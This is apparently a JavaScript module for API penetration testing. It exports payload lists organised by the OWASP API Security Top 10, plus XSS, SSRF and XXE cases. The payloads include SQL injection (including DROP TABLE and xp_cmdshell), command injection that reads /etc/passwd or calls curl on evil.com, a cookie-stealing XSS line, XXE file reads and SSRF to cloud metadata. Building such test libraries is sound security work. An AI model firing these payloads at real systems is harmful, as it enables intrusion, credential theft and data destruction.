/**
 * OWASP API Security Top 10 Test Cases
 * Comprehensive test case library for professional API security testing
 */

const OWASP_API_TEST_CASES = {
  // API1: Broken Object Level Authorization (BOLA/IDOR)
  api1: {
    name: "Broken Object Level Authorization",
    description: "APIs tend to expose endpoints that handle object identifiers, creating a wide attack surface of Object Level Access Control issues.",
    severity: "HIGH",
    testCases: [
      {
        id: "api1-001",
        name: "Direct Object Reference",
        description: "Test direct access to objects using different IDs",
        method: "GET",
        payloads: [
          "1", "2", "999999", "0", "-1", "admin", "../1", "../../1", 
          "1' OR '1'='1", "1%00", "1.json", "{\"id\":1}", "1&id=2", 
          "1#", "1/*", "99999999", "null", "undefined", "true", "false"
        ],
        headers: {},
        expectedResponses: {
          success: [200, 201, 202],
          failure: [401, 403, 404, 500]
        },
        aiPrompt: "Generate IDOR test payloads for endpoint {endpoint} with context: {context}"
      },
      {
        id: "api1-002",
        name: "Mass IDOR Testing",
        description: "Test multiple object IDs in sequence",
        method: "GET",
        payloads: ["1", "2", "3", "4", "5", "10", "100", "1000"],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [401, 403, 404]
        },
        aiPrompt: "Generate sequential ID testing payloads for mass IDOR detection"
      },
      {
        id: "api1-003",
        name: "UUID/Alternative ID Testing",
        description: "Test with UUIDs and alternative ID formats",
        method: "GET",
        payloads: [
          "00000000-0000-0000-0000-000000000000",
          "ffffffff-ffff-ffff-ffff-ffffffffffff",
          "admin", "test", "demo", "sample"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [401, 403, 404]
        },
        aiPrompt: "Generate UUID and alternative ID format payloads for IDOR testing"
      }
    ]
  },

  // API2: Broken User Authentication
  api2: {
    name: "Broken User Authentication",
    description: "Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or to exploit implementation flaws.",
    severity: "CRITICAL",
    testCases: [
      {
        id: "api2-001",
        name: "JWT Token Manipulation",
        description: "Test JWT token vulnerabilities",
        method: "POST",
        payloads: [
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
          "invalid_token",
          "",
          "null",
          "undefined",
          "Bearer ",
          "Bearer invalid",
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.admin"
        ],
        headers: {
          "Authorization": "{payload}"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [401, 403]
        },
        aiPrompt: "Generate JWT manipulation payloads for authentication bypass testing"
      },
      {
        id: "api2-002",
        name: "Credential Stuffing",
        description: "Test common credentials and password patterns",
        method: "POST",
        payloads: [
          '{"email":"admin@test.com","password":"admin"}',
          '{"email":"admin@test.com","password":"password"}',
          '{"email":"admin@test.com","password":"123456"}',
          '{"email":"admin@test.com","password":"admin123"}',
          '{"email":"admin@test.com","password":"password123"}',
          '{"email":"admin@test.com","password":"qwerty"}',
          '{"email":"admin@test.com","password":"letmein"}',
          '{"email":"admin@test.com","password":"welcome"}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [401, 403]
        },
        aiPrompt: "Generate credential stuffing payloads with common passwords and usernames"
      },
      {
        id: "api2-003",
        name: "Session Fixation",
        description: "Test session management vulnerabilities",
        method: "POST",
        payloads: [
          '{"sessionId":"fixed_session_123"}',
          '{"sessionId":"admin_session"}',
          '{"sessionId":"test_session"}',
          '{"sessionId":"1"}',
          '{"sessionId":"true"}',
          '{"sessionId":"null"}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [401, 403]
        },
        aiPrompt: "Generate session fixation and session management test payloads"
      }
    ]
  },

  // API3: Excessive Data Exposure
  api3: {
    name: "Excessive Data Exposure",
    description: "APIs tend to expose more data than necessary, relying on clients to filter the data before displaying it.",
    severity: "MEDIUM",
    testCases: [
      {
        id: "api3-001",
        name: "Field Selection Testing",
        description: "Test field selection parameters",
        method: "GET",
        payloads: [
          "?fields=*",
          "?include=all",
          "?expand=*",
          "?select=*",
          "?fields=id,name,email,password,ssn,credit_card",
          "?include=password,ssn,internal_notes",
          "?expand=user,profile,settings,internal_data"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate field selection payloads to test for excessive data exposure"
      },
      {
        id: "api3-002",
        name: "Deep Object Traversal",
        description: "Test deep object property access",
        method: "GET",
        payloads: [
          "?fields=user.profile.settings.admin",
          "?include=user.internal_data.secrets",
          "?expand=user.private_info.sensitive_data",
          "?fields=**",
          "?include=**",
          "?expand=**"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate deep object traversal payloads for sensitive data exposure testing"
      },
      {
        id: "api3-003",
        name: "Verbose Error Messages",
        description: "Test for verbose error messages that leak information",
        method: "GET",
        payloads: [
          "?id=invalid_id",
          "?id=999999",
          "?id=null",
          "?id=undefined",
          "?id=admin",
          "?id=test"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [400, 401, 403, 404, 500]
        },
        aiPrompt: "Generate payloads to test for verbose error messages and information leakage"
      }
    ]
  },

  // API4: Lack of Resources & Rate Limiting
  api4: {
    name: "Lack of Resources & Rate Limiting",
    description: "APIs often do not impose any restrictions on the size or number of resources that can be requested by the client/user.",
    severity: "MEDIUM",
    testCases: [
      {
        id: "api4-001",
        name: "Rate Limiting Bypass",
        description: "Test rate limiting mechanisms",
        method: "GET",
        payloads: [
          "?limit=999999",
          "?limit=0",
          "?limit=-1",
          "?limit=null",
          "?limit=undefined",
          "?limit=infinity",
          "?limit=1e10"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [429, 400, 403]
        },
        aiPrompt: "Generate rate limiting bypass payloads and DoS attack vectors"
      },
      {
        id: "api4-002",
        name: "Resource Exhaustion",
        description: "Test resource exhaustion attacks",
        method: "POST",
        payloads: [
          '{"data":"' + 'A'.repeat(1000000) + '"}',
          '{"items":' + JSON.stringify(Array(10000).fill({})) + '}',
          '{"query":"' + 'SELECT * FROM users '.repeat(1000) + '"}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [413, 429, 500]
        },
        aiPrompt: "Generate resource exhaustion payloads for DoS testing"
      },
      {
        id: "api4-003",
        name: "Concurrent Request Testing",
        description: "Test concurrent request handling",
        method: "GET",
        payloads: ["test_concurrent_1", "test_concurrent_2", "test_concurrent_3"],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [429, 500, 503]
        },
        aiPrompt: "Generate concurrent request testing strategies"
      }
    ]
  },

  // API5: Broken Function Level Authorization
  api5: {
    name: "Broken Function Level Authorization",
    description: "APIs tend to implement authorization at the resource level, not at the function level.",
    severity: "HIGH",
    testCases: [
      {
        id: "api5-001",
        name: "Privilege Escalation",
        description: "Test privilege escalation vulnerabilities",
        method: "POST",
        payloads: [
          '{"role":"admin"}',
          '{"role":"superuser"}',
          '{"role":"root"}',
          '{"role":"administrator"}',
          '{"isAdmin":true}',
          '{"isSuperUser":true}',
          '{"privileges":["admin","super_user"]}',
          '{"permissions":["*"]}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [401, 403]
        },
        aiPrompt: "Generate privilege escalation payloads for function level authorization testing"
      },
      {
        id: "api5-002",
        name: "Admin Function Access",
        description: "Test access to admin functions",
        method: "GET",
        payloads: [
          "/admin/users",
          "/admin/settings",
          "/admin/logs",
          "/admin/config",
          "/internal/users",
          "/management/users",
          "/system/users"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [401, 403, 404]
        },
        aiPrompt: "Generate admin function access test payloads"
      },
      {
        id: "api5-003",
        name: "Method Override",
        description: "Test HTTP method override vulnerabilities",
        method: "POST",
        payloads: [
          '{"_method":"DELETE"}',
          '{"_method":"PUT"}',
          '{"_method":"PATCH"}',
          '{"method":"DELETE"}',
          '{"http_method":"DELETE"}'
        ],
        headers: {
          "Content-Type": "application/json",
          "X-HTTP-Method-Override": "DELETE"
        },
        expectedResponses: {
          success: [200, 201, 204],
          failure: [401, 403, 405]
        },
        aiPrompt: "Generate HTTP method override payloads for authorization bypass"
      }
    ]
  },

  // API6: Mass Assignment
  api6: {
    name: "Mass Assignment",
    description: "APIs automatically bind client data to data models without proper filtering based on an allowlist.",
    severity: "MEDIUM",
    testCases: [
      {
        id: "api6-001",
        name: "Property Pollution",
        description: "Test mass assignment vulnerabilities",
        method: "POST",
        payloads: [
          '{"role":"admin","isAdmin":true,"privileges":["admin"]}',
          '{"__proto__":{"isAdmin":true}}',
          '{"constructor":{"prototype":{"isAdmin":true}}}',
          '{"isAdmin":true,"role":"admin","permissions":"*"}',
          '{"user":{"role":"admin"},"admin":true}',
          '{"settings":{"admin":true},"role":"admin"}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate mass assignment and property pollution payloads"
      },
      {
        id: "api6-002",
        name: "Nested Object Assignment",
        description: "Test nested object mass assignment",
        method: "POST",
        payloads: [
          '{"user":{"role":"admin","isAdmin":true}}',
          '{"profile":{"admin":true,"privileges":["*"]}}',
          '{"settings":{"admin":true,"permissions":"all"}}',
          '{"data":{"role":"admin","internal":true}}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate nested object mass assignment payloads"
      },
      {
        id: "api6-003",
        name: "Array Mass Assignment",
        description: "Test array-based mass assignment",
        method: "POST",
        payloads: [
          '{"roles":["admin","superuser"]}',
          '{"permissions":["*","admin","delete"]}',
          '{"privileges":["admin","super_user","root"]}',
          '{"groups":["admin","internal","management"]}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate array-based mass assignment payloads"
      }
    ]
  },

  // API7: Security Misconfiguration
  api7: {
    name: "Security Misconfiguration",
    description: "APIs and the systems supporting them typically contain complex configurations.",
    severity: "MEDIUM",
    testCases: [
      {
        id: "api7-001",
        name: "Debug Mode Testing",
        description: "Test for debug mode and verbose logging",
        method: "GET",
        payloads: [
          "?debug=true",
          "?verbose=true",
          "?trace=true",
          "?admin=true",
          "?test=true",
          "?dev=true",
          "?development=true"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate debug mode and verbose logging test payloads"
      },
      {
        id: "api7-002",
        name: "CORS Misconfiguration",
        description: "Test CORS configuration vulnerabilities",
        method: "OPTIONS",
        payloads: [],
        headers: {
          "Origin": "https://evil.com",
          "Access-Control-Request-Method": "POST",
          "Access-Control-Request-Headers": "Content-Type"
        },
        expectedResponses: {
          success: [200, 204],
          failure: [403, 404]
        },
        aiPrompt: "Generate CORS misconfiguration test headers and payloads"
      },
      {
        id: "api7-003",
        name: "Information Disclosure",
        description: "Test for information disclosure through headers and responses",
        method: "GET",
        payloads: [
          "/.env",
          "/config.json",
          "/package.json",
          "/.git/config",
          "/admin",
          "/internal",
          "/debug",
          "/status"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [401, 403, 404]
        },
        aiPrompt: "Generate information disclosure test payloads for config files and sensitive endpoints"
      }
    ]
  },

  // API8: Injection
  api8: {
    name: "Injection",
    description: "APIs are vulnerable to injection flaws when user-supplied data is sent to an interpreter as part of a command or query.",
    severity: "CRITICAL",
    testCases: [
      {
        id: "api8-001",
        name: "SQL Injection",
        description: "Test SQL injection vulnerabilities",
        method: "POST",
        payloads: [
          "' OR '1'='1",
          "1; DROP TABLE users--",
          "' UNION SELECT * FROM information_schema.tables--",
          "' AND 1=1--",
          "1' AND '1' LIKE '1",
          "admin'--",
          "' OR 1=1#",
          "1' OR '1'='1' /*",
          "'; EXEC xp_cmdshell('whoami')--",
          "' OR 'x'='x"
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403, 500]
        },
        aiPrompt: "Generate SQL injection payloads for database testing"
      },
      {
        id: "api8-002",
        name: "NoSQL Injection",
        description: "Test NoSQL injection vulnerabilities",
        method: "POST",
        payloads: [
          '{"$where":"this.password == this.username"}',
          '{"$ne":null}',
          '{"$gt":""}',
          '{"$regex":".*"}',
          '{"$exists":true}',
          '{"$or":[{"username":"admin"},{"password":"admin"}]}',
          '{"username":{"$ne":null},"password":{"$ne":null}}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403, 500]
        },
        aiPrompt: "Generate NoSQL injection payloads for MongoDB and other NoSQL databases"
      },
      {
        id: "api8-003",
        name: "Command Injection",
        description: "Test command injection vulnerabilities",
        method: "POST",
        payloads: [
          "; ls -la",
          "| whoami",
          "`id`",
          "$(curl http://evil.com)",
          "`curl http://evil.com`",
          "; cat /etc/passwd",
          "| cat /etc/passwd",
          "`cat /etc/passwd`"
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403, 500]
        },
        aiPrompt: "Generate command injection payloads for system command execution testing"
      },
      {
        id: "api8-004",
        name: "LDAP Injection",
        description: "Test LDAP injection vulnerabilities",
        method: "POST",
        payloads: [
          "*)(uid=*))(|(uid=*",
          "*)(|(password=*))",
          "*)(|(objectClass=*))",
          "admin)(&(password=*))",
          "*)(|(cn=*))",
          "*)(|(mail=*))"
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403, 500]
        },
        aiPrompt: "Generate LDAP injection payloads for directory service testing"
      }
    ]
  },

  // API9: Improper Assets Management
  api9: {
    name: "Improper Assets Management",
    description: "APIs tend to expose more endpoints than traditional web applications, making proper and updated documentation highly important.",
    severity: "LOW",
    testCases: [
      {
        id: "api9-001",
        name: "Deprecated API Testing",
        description: "Test deprecated and old API versions",
        method: "GET",
        payloads: [
          "/v1/users",
          "/v2/users",
          "/api/v1/users",
          "/api/v2/users",
          "/legacy/users",
          "/old/users",
          "/deprecated/users"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [401, 403, 404]
        },
        aiPrompt: "Generate deprecated API version testing payloads"
      },
      {
        id: "api9-002",
        name: "Internal Endpoint Testing",
        description: "Test internal and management endpoints",
        method: "GET",
        payloads: [
          "/internal/users",
          "/management/users",
          "/admin/users",
          "/system/users",
          "/debug/users",
          "/test/users",
          "/dev/users"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [401, 403, 404]
        },
        aiPrompt: "Generate internal endpoint discovery payloads"
      },
      {
        id: "api9-003",
        name: "API Version Enumeration",
        description: "Test different API version formats",
        method: "GET",
        payloads: [
          "/api/v1.0/users",
          "/api/v1.1/users",
          "/api/v2.0/users",
          "/api/2023-01-01/users",
          "/api/2023-12-01/users",
          "/api/latest/users",
          "/api/current/users"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [401, 403, 404]
        },
        aiPrompt: "Generate API version enumeration payloads"
      }
    ]
  },

  // API10: Insufficient Logging & Monitoring
  api10: {
    name: "Insufficient Logging & Monitoring",
    description: "Insufficient logging and monitoring, coupled with ineffective or absent integration with incident response.",
    severity: "LOW",
    testCases: [
      {
        id: "api10-001",
        name: "Log Injection Testing",
        description: "Test for log injection vulnerabilities",
        method: "POST",
        payloads: [
          '{"username":"admin\n[CRITICAL] Security breach detected"}',
          '{"email":"test@test.com\r\n[ERROR] Database connection failed"}',
          '{"name":"User\n[WARN] Suspicious activity detected"}',
          '{"data":"test%0A%5BCRITICAL%5D%20Security%20breach"}',
          '{"input":"test\r\n[INFO] User logged in"}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate log injection payloads for log manipulation testing"
      },
      {
        id: "api10-002",
        name: "Sensitive Data Logging",
        description: "Test if sensitive data is logged",
        method: "POST",
        payloads: [
          '{"password":"secret123","username":"admin"}',
          '{"ssn":"123-45-6789","name":"John Doe"}',
          '{"creditCard":"4111-1111-1111-1111","cvv":"123"}',
          '{"apiKey":"sk-1234567890abcdef","token":"abc123"}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate sensitive data logging test payloads"
      },
      {
        id: "api10-003",
        name: "Audit Trail Testing",
        description: "Test audit trail and monitoring capabilities",
        method: "GET",
        payloads: [
          "?audit=true",
          "?log=true",
          "?trace=true",
          "?debug=true",
          "?verbose=true"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate audit trail and monitoring test payloads"
      }
    ]
  }
};

// Additional vulnerability types
const ADDITIONAL_VULNERABILITIES = {
  xss: {
    name: "Cross-Site Scripting (XSS)",
    description: "Test for XSS vulnerabilities in API responses",
    severity: "MEDIUM",
    testCases: [
      {
        id: "xss-001",
        name: "Reflected XSS",
        description: "Test for reflected XSS in API responses",
        method: "GET",
        payloads: [
          "<script>alert('XSS')</script>",
          "<img src=x onerror=alert('XSS')>",
          "javascript:alert('XSS')",
          "<svg onload=alert('XSS')>",
          "'-alert('XSS')-'",
          "<iframe src=javascript:alert('XSS')>",
          "<body onload=alert('XSS')>",
          "<<SCRIPT>alert('XSS');//<</SCRIPT>",
          "<script>document.location='http://evil.com?c='+document.cookie</script>",
          "';alert(String.fromCharCode(88,83,83))//"
        ],
        headers: {},
        expectedResponses: {
          success: [200],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate XSS payloads for reflected XSS testing"
      }
    ]
  },
  
  ssrf: {
    name: "Server-Side Request Forgery (SSRF)",
    description: "Test for SSRF vulnerabilities",
    severity: "HIGH",
    testCases: [
      {
        id: "ssrf-001",
        name: "Internal Network Access",
        description: "Test SSRF against internal networks",
        method: "POST",
        payloads: [
          '{"url":"http://localhost"}',
          '{"url":"http://127.0.0.1"}',
          '{"url":"http://169.254.169.254"}',
          '{"url":"file:///etc/passwd"}',
          '{"url":"gopher://localhost:8080"}',
          '{"url":"dict://localhost:11211"}',
          '{"url":"http://[::1]"}',
          '{"url":"http://0.0.0.0"}'
        ],
        headers: {
          "Content-Type": "application/json"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403]
        },
        aiPrompt: "Generate SSRF payloads for internal network access testing"
      }
    ]
  },
  
  xxe: {
    name: "XML External Entity (XXE)",
    description: "Test for XXE vulnerabilities",
    severity: "HIGH",
    testCases: [
      {
        id: "xxe-001",
        name: "XXE File Access",
        description: "Test XXE for file access",
        method: "POST",
        payloads: [
          '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
          '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil">]>',
          '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
        ],
        headers: {
          "Content-Type": "application/xml"
        },
        expectedResponses: {
          success: [200, 201],
          failure: [400, 401, 403, 500]
        },
        aiPrompt: "Generate XXE payloads for external entity processing testing"
      }
    ]
  }
};

module.exports = {
  OWASP_API_TEST_CASES,
  ADDITIONAL_VULNERABILITIES,
  getAllTestCases: () => ({ ...OWASP_API_TEST_CASES, ...ADDITIONAL_VULNERABILITIES }),
  getTestCasesBySeverity: (severity) => {
    const allCases = { ...OWASP_API_TEST_CASES, ...ADDITIONAL_VULNERABILITIES };
    return Object.entries(allCases).filter(([_, vuln]) => vuln.severity === severity);
  },
  getTestCasesByVulnerability: (vulnId) => {
    const allCases = { ...OWASP_API_TEST_CASES, ...ADDITIONAL_VULNERABILITIES };
    return allCases[vulnId] || null;
  }
};
